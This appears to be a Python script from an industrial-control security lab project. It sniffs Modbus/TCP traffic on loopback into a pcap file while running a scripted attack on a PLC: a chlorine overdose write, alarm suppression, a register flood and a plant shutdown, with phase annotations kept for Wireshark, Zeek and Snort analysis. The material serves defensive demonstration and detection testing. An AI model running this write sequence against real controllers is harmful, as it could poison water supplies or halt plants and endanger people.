#!/usr/bin/env python3
"""
capture_attack.py — Real PCAP Capture of Modbus Attack Traffic
===============================================================
CPSS Project — Phase 7 Fix

Captures a real .pcap file during an attack run using scapy.
This replaces the synthetic packet_capture.py application-layer logger
with actual network-level packet capture that can be opened in Wireshark.

The script:
  1. Starts sniffing on the loopback interface (lo / lo0)
  2. Runs a scripted attack sequence (chlorine overdose → alarm suppression
     → register flood) against the PLC on port 502
  3. Saves the captured packets to evidence/attack_capture_<timestamp>.pcap
  4. Writes a Wireshark-ready annotation file (.json) with markers at the
     exact packet numbers where each attack phase begins

WHAT YOU SEE IN WIRESHARK:
  - Filter: tcp.port == 502
  - Attack packets appear as Modbus/TCP Write Single Register (FC06)
    and Write Single Coil (FC05) frames
  - The MBAP header, function code, register address, and value are all
    decoded natively by Wireshark's built-in Modbus dissector
  - The annotation file (evidence/attack_annotations.json) maps packet
    numbers to attack phase names for your demo

FORENSIC VALUE:
  Unlike the application-layer logs in packet_capture.py, a real .pcap:
  - Has cryptographically verifiable packet timestamps (libpcap format)
  - Can be loaded into Zeek, Suricata, or Snort for rule testing
  - Can be submitted as forensic evidence in an incident report
  - Proves the attack happened at the network level, not just in logs

INSTALLATION:
  pip install scapy
  # On Linux, run as root OR grant cap_net_raw:
  sudo setcap cap_net_raw+eip $(which python3)
  # Or just run with sudo for the demo:
  sudo python3 evidence/capture_attack.py

USAGE:
  sudo python3 evidence/capture_attack.py              # full attack + capture
  sudo python3 evidence/capture_attack.py --dry-run    # capture only, no attack writes
  sudo python3 evidence/capture_attack.py --duration 30 # capture for 30s
  python3 evidence/capture_attack.py --replay          # just show pcap stats (no root needed)
"""

import sys
import os
import time
import json
import threading
import argparse
from datetime import datetime
from pathlib import Path

# ── Dependency checks ──────────────────────────────────────────────────────────
try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    print("[!] pymodbus not installed: pip install pymodbus==3.6.6")
    sys.exit(1)

try:
    from scapy.all import sniff, wrpcap, rdpcap, TCP, IP, Raw
    from scapy.layers.inet import IP, TCP
    _SCAPY = True
except ImportError:
    _SCAPY = False
    print("[!] scapy not installed: pip install scapy")
    print("    Continuing in fallback mode (raw socket capture).")

# ── Config ─────────────────────────────────────────────────────────────────────
PLC_HOST     = "127.0.0.1"
PLC_PORT     = 502
EVIDENCE_DIR = Path(__file__).parent
IFACE        = "lo"              # loopback — change to "eth0" for remote PLC

# ── Colours ────────────────────────────────────────────────────────────────────
RED  = "\033[91m"
GRN  = "\033[92m"
YLW  = "\033[93m"
CYN  = "\033[96m"
BOLD = "\033[1m"
RST  = "\033[0m"

# ── Packet store (fallback if scapy unavailable) ───────────────────────────────
_captured_packets = []
_capture_lock     = threading.Lock()
_annotations      = []   # {"packet_index": N, "phase": "...", "ts": "..."}
_capture_active   = threading.Event()

def annotate(phase, description):
    """Record the current packet count as the start of a new attack phase."""
    with _capture_lock:
        idx = len(_captured_packets)
    ann = {
        "packet_index": idx,
        "phase":        phase,
        "description":  description,
        "ts":           datetime.now().isoformat(),
    }
    _annotations.append(ann)
    print(f"  {YLW}[PCAP]{RST} Phase marker: [{idx}] {phase} — {description}")

# ── Scapy sniffer thread ───────────────────────────────────────────────────────
def _sniffer_thread(pcap_path, duration):
    """
    Runs scapy sniff() in a background thread.
    Captures only TCP port 502 (Modbus) on loopback.
    """
    if not _SCAPY:
        return

    def _store(pkt):
        with _capture_lock:
            _captured_packets.append(pkt)

    print(f"  {GRN}[PCAP]{RST} Sniffing on '{IFACE}' for port 502 (duration={duration}s)...")

    try:
        pkts = sniff(
            iface=IFACE,
            filter=f"tcp port {PLC_PORT}",
            timeout=duration,
            prn=_store,
            store=True,
        )
        # scapy sniff() with store=True returns all packets; also stored via prn
        # Write the scapy-captured list directly (more reliable than our _store list)
        wrpcap(str(pcap_path), pkts)
        print(f"  {GRN}[PCAP]{RST} Capture complete — {len(pkts)} packets saved to {pcap_path}")
        with _capture_lock:
            _captured_packets.clear()
            _captured_packets.extend(pkts)
    except PermissionError:
        print(f"  {RED}[PCAP]{RST} Permission denied — run with sudo or grant cap_net_raw")
        print(f"         sudo python3 evidence/capture_attack.py")
    except OSError as e:
        if "No such device" in str(e):
            print(f"  {RED}[PCAP]{RST} Interface '{IFACE}' not found.")
            print(f"         On macOS use 'lo0'. Pass --iface lo0 if needed.")
            # Try lo0 as fallback for macOS
            try:
                pkts = sniff(
                    iface="lo0",
                    filter=f"tcp port {PLC_PORT}",
                    timeout=duration,
                    store=True,
                )
                wrpcap(str(pcap_path), pkts)
                print(f"  {GRN}[PCAP]{RST} Captured {len(pkts)} packets on lo0 → {pcap_path}")
            except Exception as e2:
                print(f"  {RED}[PCAP]{RST} lo0 also failed: {e2}")
        else:
            print(f"  {RED}[PCAP]{RST} Sniff error: {e}")

    _capture_active.set()

# ── Fallback: raw socket capture ───────────────────────────────────────────────
def _raw_fallback_thread(pcap_path, duration):
    """
    Minimal raw socket capture when scapy is not available.
    Writes a simple JSON log instead of a real pcap.
    """
    import socket
    import struct

    log_path = pcap_path.with_suffix(".json")
    packets  = []
    deadline = time.monotonic() + duration

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
        sock.settimeout(0.1)

        while time.monotonic() < deadline:
            try:
                data, _ = sock.recvfrom(65535)
                # Filter: TCP + port 502 (very rough — IP offset 23=proto, TCP src/dst at offset 34/36)
                if len(data) > 40 and data[23] == 6:  # TCP
                    src_port = struct.unpack(">H", data[34:36])[0]
                    dst_port = struct.unpack(">H", data[36:38])[0]
                    if src_port == PLC_PORT or dst_port == PLC_PORT:
                        packets.append({
                            "ts":      time.time(),
                            "hex":     data.hex(),
                            "len":     len(data),
                            "src_port": src_port,
                            "dst_port": dst_port,
                        })
            except socket.timeout:
                pass

        sock.close()
    except PermissionError:
        print(f"  {RED}[PCAP]{RST} Raw socket also requires root. Run: sudo python3 evidence/capture_attack.py")
    except Exception as e:
        print(f"  {RED}[PCAP]{RST} Fallback capture error: {e}")

    log_path.write_text(json.dumps({
        "note":    "Raw socket fallback — no scapy. Install scapy for real .pcap output.",
        "packets": packets,
        "annotations": _annotations,
    }, indent=2))
    print(f"  {YLW}[PCAP]{RST} Fallback JSON log saved to {log_path}")
    _capture_active.set()

# ── Attack sequence ────────────────────────────────────────────────────────────
def run_attack_sequence(dry_run=False):
    """
    Scripted attack sequence that generates interesting, annotated Modbus traffic.
    Runs after the sniffer is confirmed active.

    Phases:
      P1  Recon    — read all registers and coils (FC03, FC01)
      P2  Overdose — write Chlorine_Dose = 850 (FC06)
      P3  Suppress — write Alarm_LED = OFF (FC05)
      P4  Flood    — rapid FC06 writes to multiple registers
      P5  Blackout — System_Enable = OFF (FC05)
      P6  Restore  — write safe defaults (for clean exit)
    """
    time.sleep(0.5)  # brief wait for sniffer to start

    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
    if not client.connect():
        print(f"  {RED}[ATK]{RST} Cannot connect to PLC at {PLC_HOST}:{PLC_PORT}")
        return

    print(f"  {RED}[ATK]{RST} Connected — running annotated attack sequence\n")

    # Phase 1: Recon
    annotate("P1_RECON", "FC03 read all holding registers; FC01 read all coils")
    if not dry_run:
        client.read_holding_registers(0, 4)
        time.sleep(0.1)
        client.read_coils(0, 12)
        time.sleep(0.1)
        client.read_discrete_inputs(0, 4)
    time.sleep(0.5)

    # Phase 2: Chlorine overdose
    annotate("P2_OVERDOSE", "FC06 write Chlorine_Dose=850 (register 0)")
    if not dry_run:
        client.write_register(0, 850)
        time.sleep(0.2)
        client.write_register(0, 900)   # triggers BLOCK 0 clamp — shows 850 in response
        time.sleep(0.2)
    time.sleep(0.5)

    # Phase 3: Alarm suppression
    annotate("P3_ALARM_SUPPRESS", "FC05 write Alarm_LED=OFF (coil 10) while overdose active")
    if not dry_run:
        client.write_coil(10, False)   # Alarm_LED OFF
        time.sleep(0.1)
        client.write_coil(10, False)   # repeat — realistic attacker keeps suppressing
        time.sleep(0.1)
    time.sleep(0.5)

    # Phase 4: Register flood (generates high packet rate for traffic analysis)
    annotate("P4_REG_FLOOD", "Rapid FC06 writes to all 4 registers — 10 packets in quick succession")
    if not dry_run:
        for _ in range(5):
            client.write_register(0, 800)
            client.write_register(1, 500)
            client.write_register(2, 100)
            client.write_register(3, 95)
            time.sleep(0.05)
    time.sleep(0.5)

    # Phase 5: Blackout
    annotate("P5_BLACKOUT", "FC05 write System_Enable=OFF (coil 11) — plant shutdown")
    if not dry_run:
        client.write_coil(11, False)
        time.sleep(1.0)
    time.sleep(0.5)

    # Phase 6: Restore safe state (so plant isn't left broken)
    annotate("P6_RESTORE", "FC06/FC05 restore safe defaults — end of attack sequence")
    if not dry_run:
        client.write_register(0, 200)
        client.write_register(1, 300)
        client.write_register(2, 50)
        client.write_coil(10, True)
        client.write_coil(11, True)

    client.close()
    print(f"\n  {GRN}[ATK]{RST} Attack sequence complete — {len(_annotations)} phases annotated")

# ── Save annotation file ───────────────────────────────────────────────────────
def save_annotations(pcap_path):
    ann_path = EVIDENCE_DIR / "attack_annotations.json"
    ann_path.write_text(json.dumps({
        "pcap_file":   pcap_path.name,
        "plc_host":    PLC_HOST,
        "plc_port":    PLC_PORT,
        "captured_at": datetime.now().isoformat(),
        "wireshark_filter": f"tcp.port == {PLC_PORT}",
        "annotations": _annotations,
        "analysis_notes": [
            "Open the .pcap in Wireshark and apply filter: tcp.port == 502",
            "Wireshark natively decodes Modbus/TCP frames (MBAP header + PDU)",
            "Use 'mbtcp' as the display filter for pure Modbus frames",
            "Each annotation marks a packet index where an attack phase begins",
            "P2_OVERDOSE: look for FC06 frame with register addr=0x0000 value=0x0352 (850 dec)",
            "P3_ALARM_SUPPRESS: FC05 frame with coil addr=0x000A value=0x0000 (OFF)",
            "P4_REG_FLOOD: burst of FC06 frames within 50ms of each other",
            "P5_BLACKOUT: FC05 frame with coil addr=0x000B value=0x0000 (System_Enable OFF)",
            "For Zeek: zeek -r attack_capture.pcap && cat modbus.log",
            "For Snort ICS rules: snort -r attack_capture.pcap -c snort.conf",
        ],
    }, indent=2))
    print(f"  {GRN}[PCAP]{RST} Annotation file saved → {ann_path}")
    return ann_path

# ── Replay / stats mode (no root required) ────────────────────────────────────
def replay_stats(pcap_path):
    """Read an existing .pcap and print stats — no root required."""
    if not _SCAPY:
        print("[!] scapy required to read .pcap files")
        return

    if not pcap_path.exists():
        # Find most recent pcap in evidence dir
        pcaps = sorted(EVIDENCE_DIR.glob("*.pcap"), key=lambda p: p.stat().st_mtime)
        if not pcaps:
            print(f"[!] No .pcap files found in {EVIDENCE_DIR}")
            return
        pcap_path = pcaps[-1]
        print(f"  Using most recent capture: {pcap_path.name}")

    pkts = rdpcap(str(pcap_path))
    print(f"\n  {BOLD}PCAP STATS: {pcap_path.name}{RST}")
    print(f"  {'─'*50}")
    print(f"  Total packets : {len(pkts)}")

    modbus_pkts = [p for p in pkts if TCP in p and
                   (p[TCP].sport == PLC_PORT or p[TCP].dport == PLC_PORT)
                   and Raw in p]

    print(f"  Modbus TCP    : {len(modbus_pkts)}")

    fc_counts = {}
    for p in modbus_pkts:
        raw = bytes(p[Raw])
        if len(raw) >= 8:
            fc = raw[7]
            fc_name = {
                0x01:"READ_COILS", 0x03:"READ_HOLDING_REGISTERS",
                0x05:"WRITE_SINGLE_COIL", 0x06:"WRITE_SINGLE_REGISTER",
                0x0F:"WRITE_MULTIPLE_COILS", 0x10:"WRITE_MULTIPLE_REGISTERS",
            }.get(fc, f"FC_0x{fc:02X}")
            fc_counts[fc_name] = fc_counts.get(fc_name, 0) + 1

    print(f"\n  Function Code Distribution:")
    for fc_name, count in sorted(fc_counts.items(), key=lambda x: -x[1]):
        bar = "█" * min(count, 40)
        print(f"    {fc_name:<35} {count:>4}  {bar}")

    if pkts:
        duration = float(pkts[-1].time) - float(pkts[0].time)
        print(f"\n  Capture duration : {duration:.2f}s")
        if duration > 0:
            print(f"  Avg packet rate  : {len(pkts)/duration:.1f} pkt/s")
    print()

# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Real PCAP capture of Modbus attack")
    parser.add_argument("--dry-run",  action="store_true",
                        help="Capture traffic but don't write attack values to PLC")
    parser.add_argument("--duration", type=int, default=20,
                        help="Capture duration in seconds (default 20)")
    parser.add_argument("--iface",    default=IFACE,
                        help=f"Network interface (default: {IFACE}; macOS: lo0)")
    parser.add_argument("--replay",   action="store_true",
                        help="Show stats from most recent .pcap (no root needed)")
    parser.add_argument("--pcap",     default=None,
                        help="Specific .pcap file to replay (use with --replay)")
    args = parser.parse_args()

    global IFACE
    IFACE = args.iface

    print(f"""
  {BOLD}{CYN}╔══════════════════════════════════════════════════════════════╗
  ║    PCAP Capture — Modbus Attack Traffic                      ║
  ║    CPSS Project — Phase 7 Fix (Real Network Evidence)        ║
  ╚══════════════════════════════════════════════════════════════╝{RST}
    """)

    if args.replay:
        pcap_path = Path(args.pcap) if args.pcap else EVIDENCE_DIR / "placeholder.pcap"
        replay_stats(pcap_path)
        return

    # Build output path
    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap_out = EVIDENCE_DIR / f"attack_capture_{ts}.pcap"

    # Start sniffer in background thread
    if _SCAPY:
        sniffer = threading.Thread(
            target=_sniffer_thread,
            args=(pcap_out, args.duration),
            daemon=True
        )
    else:
        sniffer = threading.Thread(
            target=_raw_fallback_thread,
            args=(pcap_out, args.duration),
            daemon=True
        )
    sniffer.start()

    # Give sniffer 0.3s to bind before attack starts
    time.sleep(0.3)

    # Run attack sequence in main thread
    run_attack_sequence(dry_run=args.dry_run)

    # Wait for capture to finish
    print(f"\n  {CYN}[PCAP]{RST} Waiting for capture window to close ({args.duration}s total)...")
    _capture_active.wait(timeout=args.duration + 5)

    # Save annotations
    ann_path = save_annotations(pcap_out)

    print(f"""
  {BOLD}Output files:{RST}
    {GRN}{pcap_out}{RST}
      → Open in Wireshark: filter  tcp.port == 502
      → Zeek:  zeek -r {pcap_out.name}
      → Snort: snort -r {pcap_out.name} -c snort.conf

    {GRN}{ann_path}{RST}
      → Attack phase markers (packet index → phase name)

  {BOLD}Wireshark quick guide:{RST}
    1. File → Open → select the .pcap above
    2. Display filter:  mbtcp   (Modbus TCP only)
    3. Look for FC06 (Write Single Register) frames — those are the attacks
    4. Click any frame → Modbus/TCP → Function Code, Reference Number, Data
    5. Cross-reference packet number with attack_annotations.json
    """)

if __name__ == "__main__":
    main()